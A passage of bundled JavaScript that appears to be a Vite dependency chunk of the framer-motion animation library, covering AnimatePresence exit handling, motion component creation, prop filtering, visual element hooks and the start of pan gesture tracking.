	* Save children to render as React state. To ensure this component is concurrent-safe,
	* we check for exiting children via an effect.
	*/
	const [diffedChildren, setDiffedChildren] = useState(presentChildren);
	const [renderedChildren, setRenderedChildren] = useState(presentChildren);
	useIsomorphicLayoutEffect(() => {
		isInitialRender.current = false;
		pendingPresentChildren.current = presentChildren;
		/**
		* Update complete status of exiting children.
		*/
		for (let i = 0; i < renderedChildren.length; i++) {
			const key = getChildKey(renderedChildren[i]);
			if (!presentKeys.includes(key)) {
				if (exitComplete.get(key) !== true) exitComplete.set(key, false);
			} else {
				exitComplete.delete(key);
				exitingComponents.current.delete(key);
			}
		}
	}, [
		renderedChildren,
		presentKeys.length,
		presentKeys.join("-")
	]);
	const exitingChildren = [];
	if (presentChildren !== diffedChildren) {
		let nextChildren = [...presentChildren];
		/**
		* Loop through all the currently rendered components and decide which
		* are exiting.
		*/
		for (let i = 0; i < renderedChildren.length; i++) {
			const child = renderedChildren[i];
			const key = getChildKey(child);
			if (!presentKeys.includes(key)) {
				nextChildren.splice(i, 0, child);
				exitingChildren.push(child);
			}
		}
		/**
		* If we're in "wait" mode, and we have exiting children, we want to
		* only render these until they've all exited.
		*/
		if (mode === "wait" && exitingChildren.length) nextChildren = exitingChildren;
		setRenderedChildren(onlyElements(nextChildren));
		setDiffedChildren(presentChildren);
		/**
		* Early return to ensure once we've set state with the latest diffed
		* children, we can immediately re-render.
		*/
		return null;
	}
	/**
	* If we've been provided a forceRender function by the LayoutGroupContext,
	* we can use it to force a re-render amongst all surrounding components once
	* all components have finished animating out.
	*/
	const { forceRender } = useContext(LayoutGroupContext);
	return jsx(Fragment$1, { children: renderedChildren.map((child) => {
		const key = getChildKey(child);
		const isPresent = propagate && !isParentPresent ? false : presentChildren === renderedChildren || presentKeys.includes(key);
		const onExit = () => {
			if (exitingComponents.current.has(key)) return;
			if (exitComplete.has(key)) {
				exitingComponents.current.add(key);
				exitComplete.set(key, true);
			} else return;
			let isEveryExitComplete = true;
			exitComplete.forEach((isExitComplete) => {
				if (!isExitComplete) isEveryExitComplete = false;
			});
			if (isEveryExitComplete) {
				forceRender?.();
				setRenderedChildren(pendingPresentChildren.current);
				propagate && safeToRemove?.();
				onExitComplete && onExitComplete();
			}
		};
		return jsx(PresenceChild, {
			isPresent,
			initial: !isInitialRender.current || initial ? void 0 : false,
			custom,
			presenceAffectsLayout,
			mode,
			root,
			onExitComplete: isPresent ? void 0 : onExit,
			anchorX,
			anchorY,
			children: child
		}, key);
	}) });
};
// node_modules/framer-motion/dist/es/context/LazyContext.mjs
var LazyContext = createContext({ strict: false });
// node_modules/framer-motion/dist/es/motion/features/definitions.mjs
var featureProps = {
	animation: [
		"animate",
		"variants",
		"whileHover",
		"whileTap",
		"exit",
		"whileInView",
		"whileFocus",
		"whileDrag"
	],
	exit: ["exit"],
	drag: ["drag", "dragControls"],
	focus: ["whileFocus"],
	hover: [
		"whileHover",
		"onHoverStart",
		"onHoverEnd"
	],
	tap: [
		"whileTap",
		"onTap",
		"onTapStart",
		"onTapCancel"
	],
	pan: [
		"onPan",
		"onPanStart",
		"onPanSessionStart",
		"onPanEnd"
	],
	inView: [
		"whileInView",
		"onViewportEnter",
		"onViewportLeave"
	],
	layout: ["layout", "layoutId"]
};
var isInitialized = false;
/**
* Initialize feature definitions with isEnabled checks.
* This must be called before any motion components are rendered.
*/
function initFeatureDefinitions() {
	if (isInitialized) return;
	const initialFeatureDefinitions = {};
	for (const key in featureProps) initialFeatureDefinitions[key] = { isEnabled: (props) => featureProps[key].some((name) => !!props[name]) };
	setFeatureDefinitions(initialFeatureDefinitions);
	isInitialized = true;
}
/**
* Get the current feature definitions, initializing if needed.
*/
function getInitializedFeatureDefinitions() {
	initFeatureDefinitions();
	return getFeatureDefinitions();
}
// node_modules/framer-motion/dist/es/motion/features/load-features.mjs
function loadFeatures(features) {
	const featureDefinitions = getInitializedFeatureDefinitions();
	for (const key in features) featureDefinitions[key] = {
		...featureDefinitions[key],
		...features[key]
	};
	setFeatureDefinitions(featureDefinitions);
}
// node_modules/framer-motion/dist/es/motion/utils/valid-prop.mjs
/**
* A list of all valid MotionProps.
*
* @privateRemarks
* This doesn't throw if a `MotionProp` name is missing - it should.
*/
var validMotionProps = /* @__PURE__ */ new Set([
	"animate",
	"exit",
	"variants",
	"initial",
	"style",
	"values",
	"variants",
	"transition",
	"transformTemplate",
	"custom",
	"inherit",
	"onBeforeLayoutMeasure",
	"onAnimationStart",
	"onAnimationComplete",
	"onUpdate",
	"onDragStart",
	"onDrag",
	"onDragEnd",
	"onMeasureDragConstraints",
	"onDirectionLock",
	"onDragTransitionEnd",
	"_dragX",
	"_dragY",
	"onHoverStart",
	"onHoverEnd",
	"onViewportEnter",
	"onViewportLeave",
	"globalTapTarget",
	"propagate",
	"ignoreStrict",
	"viewport"
]);
/**
* Check whether a prop name is a valid `MotionProp` key.
*
* @param key - Name of the property to check
* @returns `true` is key is a valid `MotionProp`.
*
* @public
*/
function isValidMotionProp(key) {
	return key.startsWith("while") || key.startsWith("drag") && key !== "draggable" || key.startsWith("layout") || key.startsWith("onTap") || key.startsWith("onPan") || key.startsWith("onLayout") || validMotionProps.has(key);
}
// __vite-optional-peer-dep:@emotion/is-prop-valid:framer-motion
var is_prop_valid_framer_motion_exports = /* @__PURE__ */ __exportAll({ default: () => is_prop_valid_framer_motion_default });
var is_prop_valid_framer_motion_default;
var init_is_prop_valid_framer_motion = __esmMin((() => {
	is_prop_valid_framer_motion_default = {};
	throw new Error(`Could not resolve "@emotion/is-prop-valid" imported by "framer-motion". Is it installed?`);
}));
// node_modules/framer-motion/dist/es/render/dom/utils/filter-props.mjs
var shouldForward = (key) => !isValidMotionProp(key);
function loadExternalIsValidProp(isValidProp) {
	if (typeof isValidProp !== "function") return;
	shouldForward = (key) => key.startsWith("on") ? !isValidMotionProp(key) : isValidProp(key);
}
/**
* Emotion and Styled Components both allow users to pass through arbitrary props to their components
* to dynamically generate CSS. They both use the `@emotion/is-prop-valid` package to determine which
* of these should be passed to the underlying DOM node.
*
* However, when styling a Motion component `styled(motion.div)`, both packages pass through *all* props
* as it's seen as an arbitrary component rather than a DOM node. Motion only allows arbitrary props
* passed through the `custom` prop so it doesn't *need* the payload or computational overhead of
* `@emotion/is-prop-valid`, however to fix this problem we need to use it.
*
* By making it an optionalDependency we can offer this functionality only in the situations where it's
* actually required.
*/
try {
	loadExternalIsValidProp((init_is_prop_valid_framer_motion(), __toCommonJS(is_prop_valid_framer_motion_exports)).default);
} catch {}
function filterProps(props, isDom, forwardMotionProps) {
	const filteredProps = {};
	for (const key in props) {
		/**
		* values is considered a valid prop by Emotion, so if it's present
		* this will be rendered out to the DOM unless explicitly filtered.
		*
		* We check the type as it could be used with the `feColorMatrix`
		* element, which we support.
		*/
		if (key === "values" && typeof props.values === "object") continue;
		if (isMotionValue(props[key])) continue;
		if (shouldForward(key) || forwardMotionProps === true && isValidMotionProp(key) || !isDom && !isValidMotionProp(key) || props["draggable"] && key.startsWith("onDrag")) filteredProps[key] = props[key];
	}
	return filteredProps;
}
// node_modules/framer-motion/dist/es/context/MotionContext/index.mjs
var MotionContext = /* @__PURE__ */ createContext({});
// node_modules/framer-motion/dist/es/context/MotionContext/utils.mjs
function getCurrentTreeVariants(props, context) {
	if (isControllingVariants(props)) {
		const { initial, animate } = props;
		return {
			initial: initial === false || isVariantLabel(initial) ? initial : void 0,
			animate: isVariantLabel(animate) ? animate : void 0
		};
	}
	return props.inherit !== false ? context : {};
}
// node_modules/framer-motion/dist/es/context/MotionContext/create.mjs
function useCreateMotionContext(props) {
	const { initial, animate } = getCurrentTreeVariants(props, useContext(MotionContext));
	return useMemo(() => ({
		initial,
		animate
	}), [variantLabelsAsDependency(initial), variantLabelsAsDependency(animate)]);
}
function variantLabelsAsDependency(prop) {
	return Array.isArray(prop) ? prop.join(" ") : prop;
}
// node_modules/framer-motion/dist/es/render/html/utils/create-render-state.mjs
var createHtmlRenderState = () => ({
	style: {},
	transform: {},
	transformOrigin: {},
	vars: {}
});
// node_modules/framer-motion/dist/es/render/html/use-props.mjs
function copyRawValuesOnly(target, source, props) {
	for (const key in source) if (!isMotionValue(source[key]) && !isForcedMotionValue(key, props)) target[key] = source[key];
}
function useInitialMotionValues({ transformTemplate }, visualState) {
	return useMemo(() => {
		const state = createHtmlRenderState();
		buildHTMLStyles(state, visualState, transformTemplate);
		return Object.assign({}, state.vars, state.style);
	}, [visualState]);
}
function useStyle(props, visualState) {
	const styleProp = props.style || {};
	const style = {};
	/**
	* Copy non-Motion Values straight into style
	*/
	copyRawValuesOnly(style, styleProp, props);
	Object.assign(style, useInitialMotionValues(props, visualState));
	return style;
}
function useHTMLProps(props, visualState) {
	const htmlProps = {};
	const style = useStyle(props, visualState);
	if (props.drag && props.dragListener !== false) {
		htmlProps.draggable = false;
		style.userSelect = style.WebkitUserSelect = style.WebkitTouchCallout = "none";
		style.touchAction = props.drag === true ? "none" : `pan-${props.drag === "x" ? "y" : "x"}`;
	}
	if (props.tabIndex === void 0 && (props.onTap || props.onTapStart || props.whileTap)) htmlProps.tabIndex = 0;
	htmlProps.style = style;
	return htmlProps;
}
// node_modules/framer-motion/dist/es/render/svg/utils/create-render-state.mjs
var createSvgRenderState = () => ({
	...createHtmlRenderState(),
	attrs: {}
});
// node_modules/framer-motion/dist/es/render/svg/use-props.mjs
function useSVGProps(props, visualState, _isStatic, Component) {
	const visualProps = useMemo(() => {
		const state = createSvgRenderState();
		buildSVGAttrs(state, visualState, isSVGTag(Component), props.transformTemplate, props.style);
		return {
			...state.attrs,
			style: { ...state.style }
		};
	}, [visualState]);
	if (props.style) {
		const rawStyles = {};
		copyRawValuesOnly(rawStyles, props.style, props);
		visualProps.style = {
			...rawStyles,
			...visualProps.style
		};
	}
	return visualProps;
}
// node_modules/framer-motion/dist/es/render/svg/lowercase-elements.mjs
/**
* We keep these listed separately as we use the lowercase tag names as part
* of the runtime bundle to detect SVG components
*/
var lowercaseSVGElements = [
	"animate",
	"circle",
	"defs",
	"desc",
	"ellipse",
	"g",
	"image",
	"line",
	"filter",
	"marker",
	"mask",
	"metadata",
	"path",
	"pattern",
	"polygon",
	"polyline",
	"rect",
	"stop",
	"switch",
	"symbol",
	"svg",
	"text",
	"tspan",
	"use",
	"view"
];
// node_modules/framer-motion/dist/es/render/dom/utils/is-svg-component.mjs
function isSVGComponent(Component) {
	if (typeof Component !== "string" || Component.includes("-")) return false;
	else if (lowercaseSVGElements.indexOf(Component) > -1 || /[A-Z]/u.test(Component)) return true;
	return false;
}
// node_modules/framer-motion/dist/es/render/dom/use-render.mjs
function useRender(Component, props, ref, { latestValues }, isStatic, forwardMotionProps = false, isSVG) {
	const visualProps = (isSVG ?? isSVGComponent(Component) ? useSVGProps : useHTMLProps)(props, latestValues, isStatic, Component);
	const filteredProps = filterProps(props, typeof Component === "string", forwardMotionProps);
	const elementProps = Component !== Fragment ? {
		...filteredProps,
		...visualProps,
		ref
	} : {};
	/**
	* If component has been handed a motion value as its child,
	* memoise its initial value and render that. Subsequent updates
	* will be handled by the onChange handler
	*/
	const { children } = props;
	const renderedChildren = useMemo(() => isMotionValue(children) ? children.get() : children, [children]);
	return createElement(Component, {
		...elementProps,
		children: renderedChildren
	});
}
// node_modules/framer-motion/dist/es/motion/utils/use-visual-state.mjs
function makeState({ scrapeMotionValuesFromProps, createRenderState }, props, context, presenceContext) {
	return {
		latestValues: makeLatestValues(props, context, presenceContext, scrapeMotionValuesFromProps),
		renderState: createRenderState()
	};
}
function makeLatestValues(props, context, presenceContext, scrapeMotionValues) {
	const values = {};
	const motionValues = scrapeMotionValues(props, {});
	for (const key in motionValues) values[key] = resolveMotionValue(motionValues[key]);
	let { initial, animate } = props;
	const isControllingVariants$1 = isControllingVariants(props);
	const isVariantNode$1 = isVariantNode(props);
	if (context && isVariantNode$1 && !isControllingVariants$1 && props.inherit !== false) {
		if (initial === void 0) initial = context.initial;
		if (animate === void 0) animate = context.animate;
	}
	let isInitialAnimationBlocked = presenceContext ? presenceContext.initial === false : false;
	isInitialAnimationBlocked = isInitialAnimationBlocked || initial === false;
	const variantToSet = isInitialAnimationBlocked ? animate : initial;
	if (variantToSet && typeof variantToSet !== "boolean" && !isAnimationControls(variantToSet)) {
		const list = Array.isArray(variantToSet) ? variantToSet : [variantToSet];
		for (let i = 0; i < list.length; i++) {
			const resolved = resolveVariantFromProps(props, list[i]);
			if (resolved) {
				const { transitionEnd, transition, ...target } = resolved;
				for (const key in target) {
					let valueTarget = target[key];
					if (Array.isArray(valueTarget)) {
						/**
						* Take final keyframe if the initial animation is blocked because
						* we want to initialise at the end of that blocked animation.
						*/
						const index = isInitialAnimationBlocked ? valueTarget.length - 1 : 0;
						valueTarget = valueTarget[index];
					}
					if (valueTarget !== null) values[key] = valueTarget;
				}
				for (const key in transitionEnd) values[key] = transitionEnd[key];
			}
		}
	}
	return values;
}
var makeUseVisualState = (config) => (props, isStatic) => {
	const context = useContext(MotionContext);
	const presenceContext = useContext(PresenceContext);
	const make = () => makeState(config, props, context, presenceContext);
	return isStatic ? make() : useConstant(make);
};
// node_modules/framer-motion/dist/es/render/html/use-html-visual-state.mjs
var useHTMLVisualState = /*@__PURE__*/ makeUseVisualState({
	scrapeMotionValuesFromProps: scrapeMotionValuesFromProps$1,
	createRenderState: createHtmlRenderState
});
// node_modules/framer-motion/dist/es/render/svg/use-svg-visual-state.mjs
var useSVGVisualState = /*@__PURE__*/ makeUseVisualState({
	scrapeMotionValuesFromProps,
	createRenderState: createSvgRenderState
});
// node_modules/framer-motion/dist/es/motion/utils/symbol.mjs
var motionComponentSymbol = Symbol.for("motionComponentSymbol");
// node_modules/framer-motion/dist/es/motion/utils/use-motion-ref.mjs
/**
* Creates a ref function that, when called, hydrates the provided
* external ref and VisualElement.
*/
function useMotionRef(visualState, visualElement, externalRef) {
	/**
	* Store externalRef in a ref to avoid including it in the useCallback
	* dependency array. Including externalRef in dependencies causes issues
	* with libraries like Radix UI that create new callback refs on each render
	* when using asChild - this would cause the callback to be recreated,
	* triggering element remounts and breaking AnimatePresence exit animations.
	*/
	const externalRefContainer = useRef(externalRef);
	useInsertionEffect(() => {
		externalRefContainer.current = externalRef;
	});
	const refCleanup = useRef(null);
	return useCallback((instance) => {
		if (instance) visualState.onMount?.(instance);
		if (visualElement) instance ? visualElement.mount(instance) : visualElement.unmount();
		const ref = externalRefContainer.current;
		if (typeof ref === "function") {
			if (instance) {
				const cleanup = ref(instance);
				if (typeof cleanup === "function") refCleanup.current = cleanup;
			} else if (refCleanup.current) {
				refCleanup.current();
				refCleanup.current = null;
			} else ref(instance);
		} else if (ref) ref.current = instance;
	}, [visualElement]);
}
// node_modules/framer-motion/dist/es/context/SwitchLayoutGroupContext.mjs
/**
* Internal, exported only for usage in Framer
*/
var SwitchLayoutGroupContext = createContext({});
// node_modules/framer-motion/dist/es/utils/is-ref-object.mjs
function isRefObject(ref) {
	return ref && typeof ref === "object" && Object.prototype.hasOwnProperty.call(ref, "current");
}
// node_modules/framer-motion/dist/es/motion/utils/use-visual-element.mjs
function useVisualElement(Component, visualState, props, createVisualElement, ProjectionNodeConstructor, isSVG) {
	const { visualElement: parent } = useContext(MotionContext);
	const lazyContext = useContext(LazyContext);
	const presenceContext = useContext(PresenceContext);
	const motionConfig = useContext(MotionConfigContext);
	const reducedMotionConfig = motionConfig.reducedMotion;
	const skipAnimations = motionConfig.skipAnimations;
	const visualElementRef = useRef(null);
	/**
	* Track whether the component has been through React's commit phase.
	* Used to detect when LazyMotion features load after the component has mounted.
	*/
	const hasMountedOnce = useRef(false);
	/**
	* If we haven't preloaded a renderer, check to see if we have one lazy-loaded
	*/
	createVisualElement = createVisualElement || lazyContext.renderer;
	if (!visualElementRef.current && createVisualElement) {
		visualElementRef.current = createVisualElement(Component, {
			visualState,
			parent,
			props,
			presenceContext,
			blockInitialAnimation: presenceContext ? presenceContext.initial === false : false,
			reducedMotionConfig,
			skipAnimations,
			isSVG
		});
		/**
		* If the component has already mounted before features loaded (e.g. via
		* LazyMotion with async feature loading), we need to force the initial
		* animation to run. Otherwise state changes that occurred before features
		* loaded will be lost and the element will snap to its final state.
		*/
		if (hasMountedOnce.current && visualElementRef.current) visualElementRef.current.manuallyAnimateOnMount = true;
	}
	const visualElement = visualElementRef.current;
	/**
	* Load Motion gesture and animation features. These are rendered as renderless
	* components so each feature can optionally make use of React lifecycle methods.
	*/
	const initialLayoutGroupConfig = useContext(SwitchLayoutGroupContext);
	if (visualElement && !visualElement.projection && ProjectionNodeConstructor && (visualElement.type === "html" || visualElement.type === "svg")) createProjectionNode(visualElementRef.current, props, ProjectionNodeConstructor, initialLayoutGroupConfig);
	const isMounted = useRef(false);
	useInsertionEffect(() => {
		/**
		* Check the component has already mounted before calling
		* `update` unnecessarily. This ensures we skip the initial update.
		*/
		if (visualElement && isMounted.current) visualElement.update(props, presenceContext);
	});
	/**
	* Cache this value as we want to know whether HandoffAppearAnimations
	* was present on initial render - it will be deleted after this.
	*/
	const optimisedAppearId = props[optimizedAppearDataAttribute];
	const wantsHandoff = useRef(Boolean(optimisedAppearId) && typeof window !== "undefined" && !window.MotionHandoffIsComplete?.(optimisedAppearId) && window.MotionHasOptimisedAnimation?.(optimisedAppearId));
	useIsomorphicLayoutEffect(() => {
		/**
		* Track that this component has mounted. This is used to detect when
		* LazyMotion features load after the component has already committed.
		*/
		hasMountedOnce.current = true;
		if (!visualElement) return;
		isMounted.current = true;
		window.MotionIsMounted = true;
		visualElement.updateFeatures();
		visualElement.scheduleRenderMicrotask();
		/**
		* Ideally this function would always run in a useEffect.
		*
		* However, if we have optimised appear animations to handoff from,
		* it needs to happen synchronously to ensure there's no flash of
		* incorrect styles in the event of a hydration error.
		*
		* So if we detect a situtation where optimised appear animations
		* are running, we use useLayoutEffect to trigger animations.
		*/
		if (wantsHandoff.current && visualElement.animationState) visualElement.animationState.animateChanges();
	});
	useEffect(() => {
		if (!visualElement) return;
		if (!wantsHandoff.current && visualElement.animationState) visualElement.animationState.animateChanges();
		if (wantsHandoff.current) {
			queueMicrotask(() => {
				window.MotionHandoffMarkAsComplete?.(optimisedAppearId);
			});
			wantsHandoff.current = false;
		}
		/**
		* Now we've finished triggering animations for this element we
		* can wipe the enteringChildren set for the next render.
		*/
		visualElement.enteringChildren = void 0;
	});
	return visualElement;
}
function createProjectionNode(visualElement, props, ProjectionNodeConstructor, initialPromotionConfig) {
	const { layoutId, layout, drag, dragConstraints, layoutScroll, layoutRoot, layoutAnchor, layoutCrossfade } = props;
	visualElement.projection = new ProjectionNodeConstructor(visualElement.latestValues, props["data-framer-portal-id"] ? void 0 : getClosestProjectingNode(visualElement.parent));
	visualElement.projection.setOptions({
		layoutId,
		layout,
		alwaysMeasureLayout: Boolean(drag) || dragConstraints && isRefObject(dragConstraints),
		visualElement,
		/**
		* TODO: Update options in an effect. This could be tricky as it'll be too late
		* to update by the time layout animations run.
		* We also need to fix this safeToRemove by linking it up to the one returned by usePresence,
		* ensuring it gets called if there's no potential layout animations.
		*
		*/
		animationType: typeof layout === "string" ? layout : "both",
		initialPromotionConfig,
		crossfade: layoutCrossfade,
		layoutScroll,
		layoutRoot,
		layoutAnchor
	});
}
function getClosestProjectingNode(visualElement) {
	if (!visualElement) return void 0;
	return visualElement.options.allowProjection !== false ? visualElement.projection : getClosestProjectingNode(visualElement.parent);
}
// node_modules/framer-motion/dist/es/motion/index.mjs
/**
* Create a `motion` component.
*
* This function accepts a Component argument, which can be either a string (ie "div"
* for `motion.div`), or an actual React component.
*
* Alongside this is a config option which provides a way of rendering the provided
* component "offline", or outside the React render cycle.
*/
function createMotionComponent(Component, { forwardMotionProps = false, type } = {}, preloadedFeatures, createVisualElement) {
	preloadedFeatures && loadFeatures(preloadedFeatures);
	/**
	* Determine whether to use SVG or HTML rendering based on:
	* 1. Explicit `type` option (highest priority)
	* 2. Auto-detection via `isSVGComponent`
	*/
	const isSVG = type ? type === "svg" : isSVGComponent(Component);
	const useVisualState = isSVG ? useSVGVisualState : useHTMLVisualState;
	function MotionDOMComponent(props, externalRef) {
		/**
		* If we need to measure the element we load this functionality in a
		* separate class component in order to gain access to getSnapshotBeforeUpdate.
		*/
		let MeasureLayout;
		const configAndProps = {
			...useContext(MotionConfigContext),
			...props,
			layoutId: useLayoutId(props)
		};
		const { isStatic } = configAndProps;
		const context = useCreateMotionContext(props);
		const visualState = useVisualState(props, isStatic);
		if (!isStatic && typeof window !== "undefined") {
			useStrictMode(configAndProps, preloadedFeatures);
			const layoutProjection = getProjectionFunctionality(configAndProps);
			MeasureLayout = layoutProjection.MeasureLayout;
			/**
			* Create a VisualElement for this component. A VisualElement provides a common
			* interface to renderer-specific APIs (ie DOM/Three.js etc) as well as
			* providing a way of rendering to these APIs outside of the React render loop
			* for more performant animations and interactions
			*/
			context.visualElement = useVisualElement(Component, visualState, configAndProps, createVisualElement, layoutProjection.ProjectionNode, isSVG);
		}
		/**
		* The mount order and hierarchy is specific to ensure our element ref
		* is hydrated by the time features fire their effects.
		*/
		return jsxs(MotionContext.Provider, {
			value: context,
			children: [MeasureLayout && context.visualElement ? jsx(MeasureLayout, {
				visualElement: context.visualElement,
				...configAndProps
			}) : null, useRender(Component, props, useMotionRef(visualState, context.visualElement, externalRef), visualState, isStatic, forwardMotionProps, isSVG)]
		});
	}
	MotionDOMComponent.displayName = `motion.${typeof Component === "string" ? Component : `create(${Component.displayName ?? Component.name ?? ""})`}`;
	const ForwardRefMotionComponent = forwardRef(MotionDOMComponent);
	ForwardRefMotionComponent[motionComponentSymbol] = Component;
	return ForwardRefMotionComponent;
}
function useLayoutId({ layoutId }) {
	const layoutGroupId = useContext(LayoutGroupContext).id;
	return layoutGroupId && layoutId !== void 0 ? layoutGroupId + "-" + layoutId : layoutId;
}
function useStrictMode(configAndProps, preloadedFeatures) {
	useContext(LazyContext).strict;
}
function getProjectionFunctionality(props) {
	const { drag, layout } = getInitializedFeatureDefinitions();
	if (!drag && !layout) return {};
	const combined = {
		...drag,
		...layout
	};
	return {
		MeasureLayout: drag?.isEnabled(props) || layout?.isEnabled(props) ? combined.MeasureLayout : void 0,
		ProjectionNode: combined.ProjectionNode
	};
}
// node_modules/framer-motion/dist/es/render/components/create-proxy.mjs
function createMotionProxy(preloadedFeatures, createVisualElement) {
	if (typeof Proxy === "undefined") return createMotionComponent;
	/**
	* A cache of generated `motion` components, e.g `motion.div`, `motion.input` etc.
	* Rather than generating them anew every render.
	*/
	const componentCache = /* @__PURE__ */ new Map();
	const factory = (Component, options) => {
		return createMotionComponent(Component, options, preloadedFeatures, createVisualElement);
	};
	/**
	* Support for deprecated`motion(Component)` pattern
	*/
	const deprecatedFactoryFunction = (Component, options) => {
		return factory(Component, options);
	};
	return new Proxy(deprecatedFactoryFunction, { 
	/**
	* Called when `motion` is referenced with a prop: `motion.div`, `motion.input` etc.
	* The prop name is passed through as `key` and we can use that to generate a `motion`
	* DOM component with that name.
	*/
get: (_target, key) => {
		if (key === "create") return factory;
		/**
		* If this element doesn't exist in the component cache, create it and cache.
		*/
		if (!componentCache.has(key)) componentCache.set(key, createMotionComponent(key, void 0, preloadedFeatures, createVisualElement));
		return componentCache.get(key);
	} });
}
// node_modules/framer-motion/dist/es/render/dom/create-visual-element.mjs
var createDomVisualElement = (Component, options) => {
	return options.isSVG ?? isSVGComponent(Component) ? new SVGVisualElement(options) : new HTMLVisualElement(options, { allowProjection: Component !== Fragment });
};
// node_modules/framer-motion/dist/es/motion/features/animation/index.mjs
var AnimationFeature = class extends Feature {
	/**
	* We dynamically generate the AnimationState manager as it contains a reference
	* to the underlying animation library. We only want to load that if we load this,
	* so people can optionally code split it out using the `m` component.
	*/
	constructor(node) {
		super(node);
		node.animationState || (node.animationState = createAnimationState(node));
	}
	updateAnimationControlsSubscription() {
		const { animate } = this.node.getProps();
		if (isAnimationControls(animate)) this.unmountControls = animate.subscribe(this.node);
	}
	/**
	* Subscribe any provided AnimationControls to the component's VisualElement
	*/
	mount() {
		this.updateAnimationControlsSubscription();
	}
	update() {
		const { animate } = this.node.getProps();
		const { animate: prevAnimate } = this.node.prevProps || {};
		if (animate !== prevAnimate) this.updateAnimationControlsSubscription();
	}
	unmount() {
		this.node.animationState.reset();
		this.unmountControls?.();
	}
};
// node_modules/framer-motion/dist/es/motion/features/animation/exit.mjs
var id = 0;
var ExitAnimationFeature = class extends Feature {
	constructor() {
		super(...arguments);
		this.id = id++;
		this.isExitComplete = false;
	}
	update() {
		if (!this.node.presenceContext) return;
		const { isPresent, onExitComplete } = this.node.presenceContext;
		const { isPresent: prevIsPresent } = this.node.prevPresenceContext || {};
		if (!this.node.animationState || isPresent === prevIsPresent) return;
		if (isPresent && prevIsPresent === false) {
			/**
			* When re-entering, if the exit animation already completed
			* (element is at rest), reset to initial values so the enter
			* animation replays from the correct position.
			*/
			if (this.isExitComplete) {
				const { initial, custom } = this.node.getProps();
				if (typeof initial === "string" || typeof initial === "object" && initial !== null && !Array.isArray(initial)) {
					const resolved = resolveVariant(this.node, initial, custom);
					if (resolved) {
						const { transition, transitionEnd, ...target } = resolved;
						for (const key in target) this.node.getValue(key)?.jump(target[key]);
					}
				}
				this.node.animationState.reset();
				this.node.animationState.animateChanges();
			} else this.node.animationState.setActive("exit", false);
			this.isExitComplete = false;
			return;
		}
		const exitAnimation = this.node.animationState.setActive("exit", !isPresent);
		if (onExitComplete && !isPresent) exitAnimation.then(() => {
			this.isExitComplete = true;
			onExitComplete(this.id);
		});
	}
	mount() {
		const { register, onExitComplete } = this.node.presenceContext || {};
		if (onExitComplete) onExitComplete(this.id);
		if (register) this.unmount = register(this.id);
	}
	unmount() {}
};
// node_modules/framer-motion/dist/es/motion/features/animations.mjs
var animations = {
	animation: { Feature: AnimationFeature },
	exit: { Feature: ExitAnimationFeature }
};
// node_modules/framer-motion/dist/es/events/event-info.mjs
function extractEventInfo(event) {
	return { point: {
		x: event.pageX,
		y: event.pageY
	} };
}
var addPointerInfo = (handler) => (event) => isPrimaryPointer(event) && handler(event, extractEventInfo(event));
// node_modules/framer-motion/dist/es/events/add-pointer-event.mjs
function addPointerEvent(target, eventName, handler, options) {
	return addDomEvent(target, eventName, addPointerInfo(handler), options);
}
// node_modules/framer-motion/dist/es/utils/get-context-window.mjs
var getContextWindow = ({ current }) => {
	return current ? current.ownerDocument.defaultView : null;
};
// node_modules/framer-motion/dist/es/utils/distance.mjs
var distance = (a, b) => Math.abs(a - b);
function distance2D(a, b) {
	const xDelta = distance(a.x, b.x);
	const yDelta = distance(a.y, b.y);
	return Math.sqrt(xDelta ** 2 + yDelta ** 2);
}
// node_modules/framer-motion/dist/es/gestures/pan/PanSession.mjs
var overflowStyles = /*#__PURE__*/ new Set(["auto", "scroll"]);
/**
* @internal
*/
var PanSession = class {
	constructor(event, handlers, { transformPagePoint, contextWindow = window, dragSnapToOrigin = false, distanceThreshold = 3, element } = {}) {
		/**
		* @internal
		*/
		this.startEvent = null;
		/**
		* @internal
		*/
		this.lastMoveEvent = null;
		/**
		* @internal
		*/
		this.lastMoveEventInfo = null;
		/**
		* Raw (untransformed) event info, re-transformed each frame
		* so transformPagePoint sees the current parent matrix.
		* @internal
		*/
		this.lastRawMoveEventInfo = null;
		/**
		* @internal
		*/
		this.handlers = {};
		/**
		* @internal
		*/
		this.contextWindow = window;
		/**
		* Scroll positions of scrollable ancestors and window.
		* @internal
		*/
		this.scrollPositions = /* @__PURE__ */ new Map();
		/**
		* Cleanup function for scroll listeners.
		* @internal
		*/
		this.removeScrollListeners = null;
		this.onElementScroll = (event) => {
			this.handleScroll(event.target);
		};
		this.onWindowScroll = () => {
			this.handleScroll(window);
		};
		this.updatePoint = () => {
			if (!(this.lastMoveEvent && this.lastMoveEventInfo)) return;
			if (this.lastRawMoveEventInfo) this.lastMoveEventInfo = transformPoint(this.lastRawMoveEventInfo, this.transformPagePoint);
			const info = getPanInfo(this.lastMoveEventInfo, this.history);
			const isPanStarted = this.startEvent !== null;
			const isDistancePastThreshold = distance2D(info.offset, {
				x: 0,
				y: 0
			}) >= this.distanceThreshold;
			if (!isPanStarted && !isDistancePastThreshold) return;
			const { point } = info;
			const { timestamp } = frameData;
			this.history.push({
				...point,
				timestamp
			});
			const { onStart, onMove } = this.handlers;
			if (!isPanStarted) {
				onStart && onStart(this.lastMoveEvent, info);
				this.startEvent = this.lastMoveEvent;
			}
			onMove && onMove(this.lastMoveEvent, info);
		};
		this.handlePointerMove = (event, info) => {
			this.lastMoveEvent = event;
			this.lastRawMoveEventInfo = info;
			this.lastMoveEventInfo = transformPoint(info, this.transformPagePoint);
			frame.update(this.updatePoint, true);
		};
		this.handlePointerUp = (event, info) => {
			this.end();
			const { onEnd, onSessionEnd, resumeAnimation } = this.handlers;
			if (this.dragSnapToOrigin || !this.startEvent) resumeAnimation && resumeAnimation();
			if (!(this.lastMoveEvent && this.lastMoveEventInfo)) return;
			const panInfo = getPanInfo(event.type === "pointercancel" ? this.lastMoveEventInfo : transformPoint(info, this.transformPagePoint), this.history);
			if (this.startEvent && onEnd) onEnd(event, panInfo);
			onSessionEnd && onSessionEnd(event, panInfo);
		};
		if (!isPrimaryPointer(event)) return;
		this.dragSnapToOrigin = dragSnapToOrigin;
		this.handlers = handlers;
		this.transformPagePoint = transformPagePoint;
		this.distanceThreshold = distanceThreshold;
		this.contextWindow = contextWindow || window;
		const initialInfo = transformPoint(extractEventInfo(event), this.transformPagePoint);
		const { point } = initialInfo;
		const { timestamp } = frameData;
		this.history = [{
			...point,
			timestamp
		}];
		const { onSessionStart } = handlers;
		onSessionStart && onSessionStart(event, getPanInfo(initialInfo, this.history));
